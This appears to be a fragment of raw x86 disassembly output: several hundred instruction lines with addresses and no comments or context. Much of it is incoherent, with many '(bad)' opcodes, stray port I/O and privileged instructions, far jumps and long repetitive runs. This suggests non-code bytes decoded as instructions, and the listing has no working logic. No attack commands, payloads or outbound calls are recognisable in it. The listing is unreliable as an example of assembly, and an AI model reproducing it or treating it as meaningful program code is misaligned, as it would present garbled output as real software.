  471e05:	sbb    DWORD PTR [edi],esp
  471e07:	mov    WORD PTR [ebx],gs
  471e09:	fmul   QWORD PTR [ebp+0xa]
  471e0c:	(bad)  
  471e0d:	jb     0x471dcd
  471e0f:	inc    eax
  471e10:	and    eax,DWORD PTR [ebx+0x558e510]
  471e16:	out    dx,eax
  471e17:	scas   al,BYTE PTR es:[edi]
  471e18:	xchg   ebx,eax
  471e19:	push   cs
  471e1a:	fldl2e 
  471e1c:	sbb    DWORD PTR [ebx+0x73],edx
  471e1f:	pop    esi
  471e20:	(bad)  
  471e21:	stc    
  471e22:	sti    
  471e23:	push   ecx
  471e24:	push   cs
  471e25:	xchg   DWORD PTR [esi+ecx*2+0x5e74fc16],eax
  471e2c:	adc    al,0x1
  471e2e:	es in  al,dx
  471e30:	sub    BYTE PTR [ecx],ch
  471e32:	lea    edx,[esp+eax*4]
  471e35:	test   BYTE PTR [edi-0x4c],0x1d
  471e39:	dec    ecx
  471e3a:	and    ebx,esi
  471e3c:	pop    ds
  471e3d:	ss fs inc eax
  471e40:	push   eax
  471e41:	and    esi,DWORD PTR [esi]
  471e43:	retf   0x64f5
  471e46:	loopne 0x471e80
  471e48:	not    BYTE PTR fs:[eax-0x268743b5]
  471e4f:	popa   
  471e50:	outs   dx,DWORD PTR ds:[esi]
  471e51:	or     eax,0x6f4ad08b
  471e56:	jmp    0x471e60
  471e58:	adc    edi,DWORD PTR [esi+eax*8+0x342cb8f3]
  471e5f:	enter  0x1d73,0x7a
  471e63:	pop    esi
  471e64:	adc    cl,BYTE PTR [ebx-0x6c2cf78]
  471e6a:	imul   ecx,ecx,0x57a7e08b
  471e70:	pop    ss
  471e71:	pop    edi
  471e72:	add    al,0x7
  471e74:	or     eax,0x5d341678
  471e79:	add    DWORD PTR [edx],edx
  471e7b:	add    eax,0xd8cf599b
  471e80:	test   DWORD PTR [edx+0x707c4721],ebx
  471e86:	in     al,dx
  471e87:	in     al,0x3b
  471e89:	lock cmp BYTE PTR [ebx],ah
  471e8c:	loopne 0x471ed5
  471e8e:	dec    esp
  471e8f:	cwde   
  471e90:	sbb    DWORD PTR [esp+eiz*8],0xffffff81
  471e94:	cmp    al,0xcc
  471e96:	cmp    al,BYTE PTR [edx+edi*1-0x6f0df1b8]
  471e9d:	rcr    BYTE PTR [esi],0x5f
  471ea0:	cmp    al,BYTE PTR [esi+esi*4+0x67390dd6]
  471ea7:	pop    esp
  471ea8:	mov    edi,0x90e4d03b
  471ead:	scas   eax,DWORD PTR es:[edi]
  471eae:	add    DWORD PTR [ecx-0x2a],edi
  471eb1:	sahf   
  471eb2:	dec    ebp
  471eb3:	shr    BYTE PTR [esi+0x22],1
  471eb6:	add    DWORD PTR [eax+0x23],esp
  471eb9:	xchg   esp,eax
  471eba:	adc    edi,edx
  471ebc:	popa   
  471ebd:	jge    0x471ee9
  471ebf:	pop    ebp
  471ec0:	cmp    eax,0xc2047b81
  471ec5:	jge    0x471ef1
  471ec7:	add    esp,DWORD PTR [ebx+0x1b0c8ac6]
  471ecd:	hlt    
  471ece:	scas   eax,DWORD PTR es:[edi]
  471ecf:	pop    esi
  471ed0:	jo     0x471f18
  471ed2:	repz xor al,0x3
  471ed5:	mov    BYTE PTR [ebx+0x404783c8],cl
  471edb:	xchg   ebp,eax
  471edc:	ds (bad) 
  471ede:	mov    ecx,DWORD PTR [edx]
  471ee0:	xor    BYTE PTR [esi+eax*4+0x453cfb3],0x35
  471ee8:	pushf  
  471ee9:	xchg   esi,eax
  471eea:	imul   esp,DWORD PTR [esi],0xd8a42520
  471ef0:	pop    edi
  471ef1:	mov    eax,0x27fc0024
  471ef6:	aas    
  471ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  471ef8:	xor    ah,BYTE PTR [eax+0x6a]
  471efb:	pop    es
  471efc:	lea    edx,[ebp-0xb]
  471eff:	push   edx
  471f00:	push   0x6f09af49
  471f05:	push   es
  471f06:	xchg   edi,eax
  471f07:	lods   al,BYTE PTR ds:[esi]
  471f08:	lock and bh,BYTE PTR [ecx+0x1870e70f]
  471f0f:	xchg   edx,eax
  471f10:	xchg   ebp,eax
  471f11:	ficomp DWORD PTR [esi]
  471f13:	and    DWORD PTR [eax],eax
  471f15:	or     al,0x9
  471f17:	shl    DWORD PTR [eax],0x68
  471f1a:	and    al,0xf3
  471f1c:	and    BYTE PTR [ebp+0x7d7a2147],dl
  471f22:	cmp    DWORD PTR [eax-0x10],esp
  471f25:	fabs   
  471f27:	xor    ah,BYTE PTR [ecx-0xd]
  471f2a:	out    0x27,al
  471f2c:	mov    ah,BYTE PTR [eax-0x52]
  471f2f:	inc    eax
  471f30:	add    DWORD PTR [esi],eax
  471f32:	push   DWORD PTR [ebp+eax*4+0x4cb823e4]
  471f39:	not    BYTE PTR [eax]
  471f3b:	jle    0x471f4f
  471f3d:	(bad)  
  471f3e:	push   ds
  471f3f:	loopne 0x471f81
  471f41:	adc    ecx,esi
  471f43:	mov    cl,0x6f
  471f45:	repnz in al,0x83
  471f48:	or     BYTE PTR [esp+ecx*2],cl
  471f4b:	mov    edi,0x3eeaa991
  471f50:	fsubr  QWORD PTR [edi+0x2d833ef8]
  471f56:	test   DWORD PTR [ecx],eax
  471f58:	sbb    ch,al
  471f5a:	push   ebp
  471f5b:	or     DWORD PTR ds:0x805c6f8,ebx
  471f61:	pop    esi
  471f62:	add    bh,BYTE PTR [edi-0x37]
  471f65:	jl     0x471efe
  471f67:	ins    DWORD PTR es:[edi],dx
  471f68:	xor    al,0x4a
  471f6a:	add    BYTE PTR [eax],0x20
  471f6d:	dec    eax
  471f6e:	push   ecx
  471f6f:	push   edx
  471f70:	call   0x25132213
  471f75:	add    eax,0x7c9ea411
  471f7a:	lahf   
  471f7b:	(bad)  
  471f7c:	sbb    DWORD PTR [esi+0x3a],esp
  471f7f:	push   eax
  471f80:	mov    al,0xd7
  471f82:	adc    BYTE PTR [edx+eax*4],bl
  471f85:	call   0xd91f460d
  471f8a:	push   eax
  471f8b:	scas   eax,DWORD PTR es:[edi]
  471f8c:	mov    ds:0x29034d3c,eax
  471f91:	fsub   DWORD PTR [esi+0x14]
  471f94:	adc    ebp,DWORD PTR fs:[edx-0x55]
  471f98:	lods   al,BYTE PTR ds:[esi]
  471f99:	pop    ss
  471f9a:	fs int 0x2f
  471f9d:	sub    eax,0x352ccf21
  471fa2:	popf   
  471fa3:	push   eax
  471fa4:	data16 (bad) 
  471fa6:	jbe    0x471f64
  471fa8:	push   edi
  471fa9:	and    BYTE PTR ds:0x20eb39ce,0x1f
  471fb0:	mov    esp,0x485bb8c8
  471fb5:	mov    ebx,0xf2028a3
  471fba:	sbb    eax,0xcd30a3f8
  471fbf:	popa   
  471fc0:	fisttp QWORD PTR [ecx-0x7da0001]
  471fc6:	pmuludq mm4,QWORD PTR [edi]
  471fc9:	push   0xf00fb939
  471fce:	in     al,dx
  471fcf:	mov    esi,0xc6fd04d6
  471fd4:	push   ebx
  471fd5:	push   0x2
  471fd7:	push   ecx
  471fd8:	ins    BYTE PTR es:[edi],dx
  471fd9:	(bad)  
  471fda:	je     0x471faa
  471fdc:	xchg   edx,eax
  471fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  471fde:	mov    eax,ds:0xd59c35ff
  471fe3:	ret    0x7fc3
  471fe6:	pop    edi
  471fe7:	cmp    DWORD PTR ds:0xfaff269c,0xffffffe2
  471fef:	stos   DWORD PTR es:[edi],eax
  471ff0:	mov    al,ds:0x5101269f
  471ff5:	test   BYTE PTR ds:0xb4827dd7,ch
  471ffb:	or     al,0x33
  471ffd:	sub    al,0x98
  471fff:	push   eax
  472000:	mov    eax,ds:0x3475063
  472005:	jmp    0x9fc372e0
  47200a:	mov    cl,BYTE PTR ds:0xc2f5de60
  472010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  472011:	ja     0x47203e
  472013:	test   cl,cl
  472015:	jne    0x47203d
  472017:	mov    eax,0x82d72c15
  47201c:	loope  0x472063
  47201e:	cwde   
  47201f:	test   BYTE PTR [edi-0x58ba25c],0x1
  472026:	ret    
  472027:	mov    eax,ds:0x63f7516c
  47202c:	dec    edi
  47202d:	sahf   
  47202e:	and    ebx,ebx
  472030:	ret    
  472031:	mov    eax,0x67040a4
  472036:	shr    al,cl
  472038:	inc    edx
  472039:	sbb    BYTE PTR [esi+0x3b77637b],bl
  47203f:	not    esi
  472041:	popa   
  472042:	push   ecx
  472043:	mov    fs:0xa309b764,eax
  472049:	test   al,0x2a
  47204b:	cmp    BYTE PTR [edi],bl
  47204d:	mov    eax,0xdacb367
  472052:	mov    al,0x69
  472054:	push   edx
  472055:	xor    al,0xba
  472057:	jge    0x4720c0
  472059:	xor    ah,ah
  47205b:	fwait
  47205c:	in     al,0x1d
  47205e:	pop    es
  47205f:	iret   
  472060:	(bad)  
  472061:	lods   eax,DWORD PTR ds:[esi]
  472062:	bound  ebp,QWORD PTR [eax+0x7e]
  472065:	adc    edx,DWORD PTR [esi-0x4bba71c4]
  47206b:	(bad)  
  47206c:	test   BYTE PTR [ecx+0x2ddc0827],0x3d
  472073:	xor    bh,al
  472075:	push   esp
  472076:	inc    edx
  472077:	add    ecx,DWORD PTR [esi]
  472079:	dec    esi
  47207a:	push   ebx
  47207b:	mov    esi,0x9a1f900c
  472080:	pusha  
  472081:	add    BYTE PTR [edx+esi*1+0x8],dh
  472085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  472086:	mov    DWORD PTR [ecx],eax
  472088:	out    dx,eax
  472089:	rol    BYTE PTR [esi-0x2a],0x89
  47208d:	push   ecx
  47208e:	into   
  47208f:	inc    edi
  472090:	add    ecx,eax
  472092:	add    esp,DWORD PTR ds:[esi]
  472095:	jns    0x4720f2
  472097:	mov    dh,0x55
  472099:	dec    edx
  47209a:	push   ebx
  47209b:	or     al,0xef
  47209d:	and    eax,0x432e7063
  4720a2:	jb     0x4720e4
  4720a4:	sub    al,0x63
  4720a6:	jo     0x4720e4
  4720a8:	sbb    dh,BYTE PTR [edx+0x30]
  4720ab:	(bad)  
  4720ac:	add    eax,DWORD PTR cs:[edx]
  4720af:	xor    DWORD PTR cs:[ecx-0x45],ecx
  4720b3:	sar    edx,1
  4720b5:	out    dx,eax
  4720b6:	scas   al,BYTE PTR es:[edi]
  4720b7:	cmp    BYTE PTR [eax],ah
  4720b9:	or     ch,BYTE PTR [edi+0x64]
  4720bc:	push   ebx
  4720bd:	gs ins BYTE PTR es:[edi],dx
  4720bf:	(bad)  
  4720c0:	gs or  BYTE PTR fs:[esi+esi*1],dl
  4720c5:	in     eax,dx
  4720c6:	aas    
  4720c7:	jnp    0x472110
  4720c9:	jb     0x47212c
  4720cb:	jns    0x4720dd
  4720cd:	es inc esp
  4720cf:	imul   esi,DWORD PTR [ebx+0x61],0x9146c62
  4720d6:	inc    ebx
  4720d7:	push   0xd7fcbfef
  4720dc:	cmp    ch,BYTE PTR [ebx+0x13]
  4720df:	inc    esi
  4720e0:	outs   dx,DWORD PTR ds:[esi]
  4720e1:	arpl   WORD PTR [ebp+0x73],si
  4720e4:	inc    esp
  4720e5:	gs popaw 
  4720e8:	jne    0x472156
  4720ea:	je     0x47213c
  4720ec:	dec    eax
  4720ed:	std    
  4720ee:	mov    ebx,0x746ffddd
  4720f3:	dec    esp
  4720f4:	imul   esp,DWORD PTR [edi+0x68],0x616e4915
  4720fb:	mov    WORD PTR [ecx+0x76],gs
  4720fe:	gs ds dec esi
  472101:	outs   dx,DWORD PTR ds:[esi]
  472102:	inc    ecx
  472103:	arpl   WORD PTR [ebx-0x33],sp
  472106:	in     al,dx
  472107:	jge    0x4720b7
  472109:	lods   al,BYTE PTR ds:[esi]
  47210a:	or     eax,0xc2526b13
  47210f:	or     ebx,DWORD PTR [edx]
  472111:	or     al,0x7e
  472113:	jb     0x472114
  472115:	jg     0x4720c6
  472117:	ins    DWORD PTR es:[edi],dx
  472118:	inc    edx
  472119:	xor    DWORD PTR fs:[edi],edx
  47211c:	xor    cl,BYTE PTR [esi]
  47211e:	(bad)  
  47211f:	outs   dx,DWORD PTR ds:[esi]
  472120:	ins    DWORD PTR es:[edi],dx
  472121:	bound  ebp,QWORD PTR [edi+0x42]
  472124:	outs   dx,DWORD PTR ds:[esi]
  472125:	js     0x47216c
  472127:	imul   esi,DWORD PTR fs:[edi+eax*1-0x60],0x57ff83fd
  472130:	imul   ebp,DWORD PTR [esi+0x64],0x9073776f
  472137:	in     al,dx
  472138:	cmp    al,0x6
  47213a:	andps  xmm1,XMMWORD PTR [edi+0x77]
  47213e:	outs   dx,BYTE PTR ds:[esi]
  47213f:	dec    esi
  472140:	inc    esp
  472141:	aas    
  472142:	sbb    dl,BYTE PTR [esp+edi*4]
  472145:	xor    BYTE PTR [edi+0x53],dh
  472148:	je     0x4721ab
  47214a:	dec    edx
  47214b:	add    ebp,DWORD PTR [eax+0x7]
  47214e:	and    al,0x92
  472150:	inc    ebp
  472151:	pushf  
  472152:	pushf  
  472153:	pushf  
  472154:	jl     0x472165
  472156:	and    BYTE PTR [eax+ebx*1],bl
  472159:	adc    al,0x9c
  47215b:	pushf  
  47215c:	pushf  
  47215d:	pushf  
  47215e:	adc    BYTE PTR [eax+ecx*1],cl
  472161:	add    al,0x4e
  472163:	inc    esi
  472164:	sahf   
  472165:	pushf  
  472166:	add    BYTE PTR [ebx+edx*4],bh
  472169:	cmp    BYTE PTR [esp+eiz*8],dh
  47216c:	in     al,0x42
  47216e:	dec    esi
  47216f:	xor    BYTE PTR [eax+ebp*1],ch
  472172:	in     al,0xe4
  472174:	in     al,0xe4
  472176:	and    al,0x20
  472178:	sbb    al,0x18
  47217a:	in     al,0xe4
  47217c:	in     al,0xe4
  47217e:	adc    al,0x10
  472180:	or     al,0x8
  472182:	xor    dh,dl
  472184:	in     al,0xe4
  472186:	add    al,0x0
  472188:	cld    
  472189:	xchg   edx,eax
  47218a:	clc    
  47218b:	jb     0x4721ff
  47218d:	jb     0x472201
  47218f:	hlt    
  472190:	lock in al,dx
  472192:	call   0x72b9940d
  472197:	in     al,0xe0
  472199:	(bad)  
  47219b:	(bad)  
  47219c:	in     al,0xe4
  47219e:	in     al,0xe4
  4721a0:	aam    0xd0
  4721a2:	int3   
  4721a3:	enter  0xe4e4,0xe4
  4721a7:	in     al,0xc4
  4721a9:	sar    BYTE PTR [eax+edi*4-0x1b1b1b1c],0xb4
  4721b1:	mov    al,0xac
  4721b3:	test   al,0xe4
  4721b5:	in     al,0xe4
  4721b7:	in     al,0xa4
  4721b9:	mov    al,ds:0xe4e4989c
  4721be:	in     al,0xe4
  4721c0:	xchg   esp,eax
  4721c1:	nop
  4721c2:	mov    WORD PTR [eax-0x1b1b1b1c],cs
  4721c8:	test   BYTE PTR [eax-0x1b1b8784],al
  4721ce:	in     al,0xe4
  4721d0:	je     0x472242
  4721d2:	ins    BYTE PTR es:[edi],dx
  4721d3:	push   0xe4e4e4e4
  4721d8:	fs pusha 
  4721da:	pop    esp
  4721db:	pop    eax
  4721dc:	in     al,0xe4
  4721de:	in     al,0xe4
  4721e0:	push   esp
  4721e1:	push   eax
  4721e2:	dec    esp
  4721e3:	dec    eax
  4721e4:	in     al,0xe4
  4721e6:	in     al,0xe4
  4721e8:	inc    esp
  4721e9:	inc    eax
  4721ea:	cmp    al,0x38
  4721ec:	sbb    esp,esp
  4721ee:	in     al,0xe4
  4721f0:	xor    al,0x30
  4721f2:	sub    al,0x93
  4721f4:	xor    dh,dl
  4721f6:	in     al,0x36
  4721f8:	cmove  ebp,DWORD PTR [esp+edx*4]
  4721fc:	sub    BYTE PTR [edx+0x72],dh
  4721ff:	jb     0x472273
  472201:	and    al,0x20
  472203:	sbb    al,0x18
  472205:	jb     0x472279
  472207:	jb     0x47227b
  472209:	adc    al,0x10
  47220b:	or     al,0x8
  47220d:	sbb    DWORD PTR [ecx+0x72],edi
  472210:	jb     0x472216
  472212:	add    ah,bh
  472214:	xchg   ebx,eax
  472215:	clc    
  472216:	cmp    DWORD PTR [ecx],edi
  472218:	cmp    DWORD PTR [ecx],edi
  47221a:	hlt    
  47221b:	lock in al,dx
  47221d:	call   0x39805b5b
  472222:	in     al,0xe0
  472224:	(bad)  
  472226:	cmp    DWORD PTR [ecx],edi
  472228:	cmp    DWORD PTR [ecx],edi
  47222a:	aam    0xd0
  47222c:	int3   
  47222d:	enter  0x3939,0x39
  472231:	cmp    esp,eax
  472233:	sar    BYTE PTR [eax+edi*4+0x39393939],0xb4
  47223b:	mov    al,0xac
  47223d:	test   al,0x39
  47223f:	cmp    DWORD PTR [ecx],edi
  472241:	cmp    DWORD PTR [eax+eiz*4+0x3939989c],esp
  472248:	cmp    DWORD PTR [ecx],edi
  47224a:	xchg   esp,eax
  47224b:	nop
  47224c:	mov    WORD PTR [eax+0x39393939],cs
  472252:	test   BYTE PTR [eax+0x3939787c],al
  472258:	cmp    DWORD PTR [ecx],edi
  47225a:	je     0x4722cc
  47225c:	ins    BYTE PTR es:[edi],dx
  47225d:	push   0x39393939
  472262:	fs pusha 
  472264:	pop    esp
  472265:	pop    eax
  472266:	pushf  
  472267:	mov    WORD PTR [ecx+edi*1],?
  47226a:	push   esp
  47226b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47226c:	xchg   esi,eax
  47226d:	mov    al,ds:0x9c9c9c98
  472272:	pushf  
  472273:	nop
  472274:	mov    WORD PTR [eax-0x6363636c],cs
  47227a:	pushf  
  47227b:	pushf  
  47227c:	test   BYTE PTR [eax-0x63636384],al
  472282:	pushf  
  472283:	js     0x4722f9
  472285:	jo     0x4722f3
  472287:	pushf  
  472288:	pushf  
  472289:	pushf  
  47228a:	pushf  
  47228b:	push   0x9c5c6064
  472290:	pushf  
  472291:	pushf  
  472292:	pushf  
  472293:	pop    eax
  472294:	push   esp
  472295:	push   eax
  472296:	dec    esp
  472297:	pushf  
  472298:	pushf  
  472299:	pushf  
  47229a:	pushf  
  47229b:	dec    eax
  47229c:	inc    esp
  47229d:	inc    eax
  47229e:	cmp    al,0x9c
  4722a0:	pushf  
  4722a1:	pushf  
  4722a2:	pushf  
  4722a3:	cmp    BYTE PTR [eax+esi*1],dh
  4722a6:	sub    al,0x9c
  4722a8:	pushf  
  4722a9:	pushf  
  4722aa:	pushf  
  4722ab:	sub    BYTE PTR [eax+eiz*1],ah
  4722ae:	sbb    al,0x9c
  4722b0:	pushf  
  4722b1:	pushf  
  4722b2:	pushf  
  4722b3:	sbb    BYTE PTR [eax+edx*1],dl
  4722b6:	or     al,0x9e
  4722b8:	pushf  
  4722b9:	pushf  
  4722ba:	pushf  
  4722bb:	or     BYTE PTR [eax+eax*1],al
  4722be:	cld    
  4722bf:	xchg   ebp,eax
  4722c0:	dec    esi
  4722c1:	dec    esi
  4722c2:	dec    esi
  4722c3:	inc    esi
  4722c4:	clc    
  4722c5:	hlt    
  4722c6:	lock in al,dx
  4722c8:	dec    esi
  4722c9:	dec    esi
  4722ca:	dec    esi
  4722cb:	dec    esi
  4722cc:	call   0x4f2403b5
  4722d1:	dec    esi
  4722d2:	dec    esi
  4722d3:	dec    esi
  4722d4:	fcom   st(4)
  4722d6:	ror    ah,1
  4722d8:	pushf  
  4722d9:	pushf  
  4722da:	pushf  
  4722db:	fdivr  QWORD PTR [edi-0x433f3b38]
  4722e1:	pushf  
  4722e2:	pushf  
  4722e3:	pushf  
  4722e4:	pushf  
  4722e5:	mov    eax,0x9cacb0b4
  4722ea:	pushf  
  4722eb:	pushf  
  4722ec:	pushf  
  4722ed:	test   al,0xa4
  4722ef:	mov    al,ds:0x9c9c9c9c
  4722f4:	pushf  
  4722f5:	cwde   
  4722f6:	xchg   esp,eax
  4722f7:	nop
  4722f8:	mov    WORD PTR [esp+ebx*4-0x7b776364],ds
  4722ff:	cmp    BYTE PTR [ebx+ebx*8-0x7b],0x9c
  472304:	pushf  
  472305:	js     0x47237b
  472307:	jo     0x472318
  472309:	xchg   ebx,eax
  47230a:	xchg   ebx,eax
  47230b:	xchg   ebx,eax
  47230c:	xchg   ebx,eax
  47230d:	ins    BYTE PTR es:[edi],dx
  47230e:	push   0x39396064
  472313:	mov    ecx,0x54585c90
  472318:	push   eax
  472319:	cmp    DWORD PTR [ecx],edi
  47231b:	cmp    DWORD PTR [ecx],edi
  47231d:	dec    esp
  47231e:	dec    eax
  47231f:	inc    esp
  472320:	inc    eax
  472321:	cmp    DWORD PTR [ecx],edi
  472323:	cmp    DWORD PTR [ecx],edi
  472325:	cmp    al,0x38
  472327:	xor    al,0x30
  472329:	cmp    DWORD PTR [ecx],edi
  47232b:	cmp    DWORD PTR [ecx],edi
  47232d:	sub    al,0x28
  47232f:	and    al,0x20
  472331:	cmp    DWORD PTR [ecx],edi
  472333:	cmp    DWORD PTR [ecx],edi
  472335:	sbb    al,0x18
  472337:	adc    al,0x10
  472339:	cmp    DWORD PTR [ecx],edi
  47233b:	cmp    DWORD PTR [ecx],edi
  47233d:	or     al,0x8
  47233f:	add    al,0x0
  472341:	pushf  
  472342:	pushf  
  472343:	mov    WORD PTR [esp+edi*8],?
  472346:	xchg   esp,eax
  472347:	clc    
  472348:	hlt    
  472349:	lock pushf 
  47234b:	pushf  
  47234c:	pushf  
  47234d:	pushf  
  47234e:	in     al,dx
  47234f:	call   0x9ce40438
  472354:	pushf  
  472355:	pushf  
  472356:	(bad)  
  472358:	aam    0xd0
  47235a:	pushf  
  47235b:	pushf  
  47235c:	pushf  
  47235d:	pushf  
  47235e:	int3   
  47235f:	enter  0xc0c4,0x9c
  472363:	pushf  
  472364:	pushf  
  472365:	pushf  
  472366:	mov    esp,0x9cb0b4b8
  47236b:	pushf  
  47236c:	pushf  
  47236d:	pushf  
  47236e:	lods   al,BYTE PTR ds:[esi]
  47236f:	test   al,0xa4
  472371:	mov    al,ds:0x9c9c9c9c
  472376:	pushf  
  472377:	cwde   
  472378:	xchg   esp,eax
  472379:	nop
  47237a:	pushf  
  47237b:	pushf  
  47237c:	pushf  
  47237d:	pushf  
  47237e:	mov    WORD PTR [eax-0x63637f7c],cs
  472384:	pushf  
  472385:	pushf  
  472386:	jl     0x472400
  472388:	je     0x4723fa
  47238a:	pushf  
  47238b:	pushf  
  47238c:	pushf  
  47238d:	pushf  
  47238e:	ins    BYTE PTR es:[edi],dx
  47238f:	push   0x9c9c6064
  472394:	pushf  
  472395:	pushf  
  472396:	pop    esp
  472397:	pop    eax
  472398:	push   esp
  472399:	push   eax
  47239a:	pushf  
  47239b:	pushf  
  47239c:	pushf  
  47239d:	pushf  
  47239e:	dec    esp
  47239f:	dec    eax
  4723a0:	inc    esp
  4723a1:	inc    eax
  4723a2:	(bad)  
  4723a3:	mov    ebp,0x383c9c9c
  4723a8:	movzx  eax,WORD PTR [edx+edx*8]
  4723ac:	shl    edx,0x10
  4723af:	or     eax,edx
  4723b1:	sub    DWORD PTR [ecx],edi
  4723b3:	icebp  
  4723b4:	sbb    BYTE PTR [edx-0x3bb19fab],ah
  4723ba:	mov    bh,0x25
  4723bc:	shl    ah,1
  4723be:	nop
  4723bf:	and    eax,0xa80b8855
  4723c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4723c5:	sti    
  4723c6:	into   
  4723c7:	into   
  4723c8:	mov    fs,WORD PTR [ecx]
  4723ca:	mov    al,0x50
  4723cc:	or     eax,0x9bb839c0
  4723d1:	adc    ebx,DWORD PTR [eax]
  4723d3:	in     eax,dx
  4723d4:	nop
  4723d5:	xor    edi,DWORD PTR [esi-0x5e]
  4723d8:	or     BYTE PTR [ecx+0x1aef1ab5],al
  4723de:	mov    edi,?
  4723e0:	scas   al,BYTE PTR es:[edi]
  4723e1:	push   ecx
  4723e2:	mov    dl,0xf
  4723e4:	mov    edi,0xbadfa58b
  4723e9:	push   0x2
  4723eb:	or     al,BYTE PTR [esp+0x2]
  4723ef:	mov    DWORD PTR [edx+0x4],eax
  4723f2:	dec    esi
  4723f3:	mov    cx,si
  4723f6:	int3   
  4723f7:	fisub  DWORD PTR [ebp+0x6624e810]
  4723fd:	cld    
  4723fe:	push   cs
  4723ff:	sub    bh,BYTE PTR [edx+edi*8]
  472402:	xor    BYTE PTR gs:[edi-0x3cbfa284],0x2f
  47240a:	xchg   esp,eax
  47240b:	ffree  st(0)
  47240d:	and    esp,DWORD PTR [eax-0x3f038539]
  472413:	bndldx bnd0,[ecx-0x16]
  472417:	(bad)  
  472418:	pop    esp
  472419:	mov    ebx,eax
  47241b:	iret   
  47241c:	repz mov esp,0x60ca9c7
  472422:	adc    BYTE PTR [eax+ebx*1],dl
  472425:	sbb    al,0x56
  472427:	shl    bl,0x3c
  47242a:	and    BYTE PTR [eax+ebp*1],ah
  47242d:	mov    ds:0xdcc97fd6,eax
  472432:	push   edi
  472433:	push   esi
  472434:	popf   
  472435:	pop    esp
  472436:	xor    DWORD PTR [esi],ebx
  472438:	dec    esp
  472439:	mov    eax,esi
  47243b:	push   es
  47243c:	mov    ah,0xb1
  47243e:	(bad)  
  47243f:	ds pop ebp
  472441:	ret    0x4624
  472444:	scas   eax,DWORD PTR es:[edi]
  472445:	aam    0xd5
  472447:	mov    esp,0xab51a7e1
  47244c:	and    BYTE PTR ds:0x7f2614fc,al
  472452:	push   ecx
  472453:	and    edx,esi
  472455:	stc    
  472456:	scas   al,BYTE PTR es:[edi]
  472457:	or     bh,al
  472459:	and    BYTE PTR [eax],dh
  47245b:	outs   dx,DWORD PTR ds:[esi]
  47245c:	fs inc esp
  47245e:	or     dl,al
  472460:	pop    ecx
  472461:	js     0x472459
  472463:	mov    cl,0x75
  472465:	mov    dh,0x68
  472467:	dec    esp
  472468:	pop    ss
  472469:	pop    ebx
  47246a:	lock bound eax,QWORD PTR [edx]
  47246d:	push   0x818c1d5c
  472472:	arpl   WORD PTR [edi],bx
  472474:	mov    DWORD PTR [esi],eax
  472476:	push   0x24071774
  47247b:	adc    DWORD PTR ds:0x14b200f0,0xf9a65b1e
  472485:	cmp    dh,BYTE PTR [edx+0x285c6453]
  47248b:	or     al,0x90
  47248d:	adc    DWORD PTR [ebp+0x76],0x3f0c4544
  472494:	inc    edi
  472495:	pop    es
  472496:	mov    eax,fs:0x908e783
  47249c:	xchg   edx,eax
  47249d:	(bad)  
  47249e:	sar    eax,cl
  4724a0:	test   dh,0x15
  4724a3:	dec    ebp
  4724a4:	pop    edx
  4724a5:	add    BYTE PTR [ebp+0x61],cl
  4724a8:	gs ins BYTE PTR es:[di],dx
  4724ab:	(bad)  
  4724ac:	out    dx,al
  4724ad:	mov    edi,0x4d208803
  4724b2:	push   ebx
  4724b3:	push   edi
  4724b4:	dec    eax
  4724b5:	inc    ebp
  4724b6:	inc    ebp
  4724b7:	dec    esp
  4724b8:	add    BYTE PTR [edi],ah
  4724ba:	outs   dx,DWORD PTR ds:[esi]
  4724bb:	jge    0x4724aa
  4724bd:	addr16 push edi
  4724bf:	xchg   edx,eax
  4724c0:	pop    edx
  4724c1:	push   cs
  4724c2:	and    eax,0x4c4f525f
  4724c7:	dec    esp
  4724c8:	push   ss
  4724c9:	inc    edi
  4724ca:	push   ds
  4724cb:	dec    eax
  4724cc:	pop    edi
  4724cd:	mov    esi,0x23f8af77
  4724d2:	push   ebx
  4724d3:	push   ebp
  4724d4:	mov    al,0x4f
  4724d6:	push   edx
  4724d7:	push   esp
  4724d8:	pop    edi
  4724d9:	sub    BYTE PTR [edi+0x2e],bl
  4724dc:	push   ebx
  4724dd:	inc    ebx
  4724de:	mov    esp,0x4befdb41
  4724e3:	pop    edi
  4724e4:	dec    esp
  4724e5:	dec    ecx
  4724e6:	dec    esi
  4724e7:	inc    ebp
  4724e8:	push   ebx
  4724e9:	das    
  4724ea:	pop    es
  4724eb:	mov    cl,0x6f
  4724ed:	cs in  al,0x25
  4724f0:	xchg   DWORD PTR [eax+edi*4+0x6f],esi
  4724f4:	je     0x472476
  4724f6:	pop    esp
  4724f7:	ror    BYTE PTR [ebp+0x6f],cl
  4724fa:	jmp    0x1cfb5377
  4724ff:	leave  
  472500:	lock js 0x472543
  472503:	lock dec esi
  472505:	dec    esi
  472506:	cmp    dl,BYTE PTR [ecx-0xd0ef04c]
  47250c:	repz dec esi
  47250e:	dec    esi
  47250f:	dec    esi
  472510:	dec    esi
  472511:	hlt    
  472512:	cmc    
  472513:	div    bh
  472515:	dec    esi
  472516:	dec    esi
  472517:	dec    esi
  472518:	dec    esi
  472519:	clc    
  47251a:	stc    
  47251b:	cli    
  47251c:	sti    
  47251d:	dec    esi
  47251e:	dec    esi
  47251f:	dec    esi
  472520:	dec    esi
  472521:	cld    
  472522:	std    
  472523:	(bad)  
  472524:	dec    DWORD PTR [esi+0x4e]
  472527:	dec    esi
  472528:	dec    esi
  472529:	loopne 0x47250c
  47252b:	loop   0x472510
  47252d:	dec    esi
  47252e:	dec    esi
  47252f:	dec    esi
  472530:	dec    esi
  472531:	in     al,0xe5
  472533:	out    0xe7,al
  472535:	dec    esi
  472536:	dec    esi
  472537:	dec    esi
  472538:	dec    esi
  472539:	call   0x4f331027
  47253e:	dec    esi
  47253f:	dec    esi
  472540:	dec    esi
  472541:	in     al,dx
  472542:	in     eax,dx
  472543:	out    dx,al
  472544:	out    dx,eax
  472545:	dec    esi
  472546:	dec    esi
  472547:	dec    esi
  472548:	dec    esi
  472549:	rcl    cl,1
  47254b:	rcl    bl,cl
  47254d:	dec    esi
  47254e:	dec    esi
  47254f:	dec    esi
  472550:	dec    esi
  472551:	aam    0xd5
  472553:	(bad)  
  472554:	xlat   BYTE PTR ds:[ebx]
  472555:	dec    esi
  472556:	dec    esi
  472557:	dec    esi
  472558:	dec    esi
  472559:	fcomp  st(1)
  47255b:	fcmovu st,st(3)
